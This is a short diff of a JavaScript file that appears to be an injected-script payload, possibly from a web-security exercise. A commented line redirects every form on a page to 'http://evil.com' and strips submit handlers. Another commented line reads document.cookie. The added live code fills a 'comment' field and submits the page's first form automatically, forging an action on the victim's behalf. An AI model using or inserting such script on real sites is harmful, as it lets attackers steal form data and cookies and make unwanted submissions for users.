@@ -16,10 +16,15 @@
 
 // var f=document.forms;var i=f.length-1;do{f[i].action="http://evil.com";f[i].onsubmit=null;}while(--i);
 
-console.log('cookie', document.cookie);
+// console.log('cookie', document.cookie);
 
 
-var b = document.createElement("b");
-var sf = document.createTextNode("some feedback");
-b.appendChild(sf);
-document.getElementsByTagName("section")[0].appendChild(b);
+// var b = document.createElement("b");
+// var sf = document.createTextNode("some feedback");
+// b.appendChild(sf);
+// document.getElementsByTagName("section")[0].appendChild(b);
+
+
+
+document.getElementsByName("comment")[0].value = "some feedback";
+document.getElementsByTagName("form")[0].submit();
